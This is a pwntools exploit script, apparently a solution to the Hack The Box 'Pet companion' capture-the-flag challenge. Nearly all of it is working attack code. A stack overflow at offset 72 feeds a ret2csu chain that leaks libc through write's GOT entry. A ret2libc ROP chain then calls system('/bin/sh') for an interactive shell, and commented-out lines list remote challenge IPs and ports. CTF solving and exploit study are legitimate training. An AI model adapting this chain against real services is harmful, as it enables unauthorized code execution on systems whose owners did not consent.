'''
__libc_csu_init

https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/%5BEasy%5D%20Pet%20companion

cyclic 1024
cyclic -l raaa
68+4 == 72

0x00000000004004de : ret
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 72

elf = ELF('./pet_companion')
libc = ELF('./glibc/libc.so.6')

padding = offset*b'A'

#ip, port='161.35.168.118', 30070
#ip, port = '83.136.250.41', 46944   #HTB
#io = remote(ip,port)
io = process('./pet_companion')
#io = gdb.debug('./pet_companion','break main')


'''
   0x0000000000400720 <+64>:	mov    rdx,r15
   0x0000000000400723 <+67>:	mov    rsi,r14
   0x0000000000400726 <+70>:	mov    edi,r13d
   0x0000000000400729 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040072d <+77>:	add    rbx,0x1
   0x0000000000400731 <+81>:	cmp    rbp,rbx
   0x0000000000400734 <+84>:	jne    0x400720 <__libc_csu_init+64>
   0x0000000000400736 <+86>:	add    rsp,0x8
   0x000000000040073a <+90>:	pop    rbx
   0x000000000040073b <+91>:	pop    rbp
   0x000000000040073c <+92>:	pop    r12
   0x000000000040073e <+94>:	pop    r13
   0x0000000000400740 <+96>:	pop    r14
   0x0000000000400742 <+98>:	pop    r15
   0x0000000000400744 <+100>:	ret  
'''

'''
# ret2csu to leak libc address
r.sendline(flat({
  0x48: p64(e.sym.__libc_csu_init + 90)    +
        p64(0) + p64(1) + p64(e.got.write) +
        p64(1) + p64(e.got.write) + p64(8) +
        p64(e.sym.__libc_csu_init + 64)    +
        p64(0) * 7 + p64(e.sym.main)
}))
'''

#write(1, write.got, 8)
shellcode = p64(0x000000000040073a) + p64(0) + p64(1) + p64(elf.got.write) + p64(1) + p64(elf.got.write) + p64(8)
print_write = p64(0x0000000000400720)
shellcode2 = p64(0)*7 + p64(elf.sym.main)

payload = padding
payload += shellcode
payload += print_write
payload += shellcode2

io.recvuntil('current status:')
io.sendline(payload)

#io.recvline_contains('\x7f')
io.recvline()
io.recvline()
io.recvline()
libc_write = u64(io.recvline().strip())
#print(hex(libc_write))

libc.address = libc_write - libc.sym.write

'''
# ret2libc
rop = ROP(libc, base=libc.address)
rop.call(rop.ret[0])
rop.system(next(libc.search(b'/bin/sh\x00')))
r.sendline(flat({0x48: rop.chain()}))
'''
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + rop_libc.chain()
io.recvuntil('current status:')
io.sendline(payload2)
io.interactive()
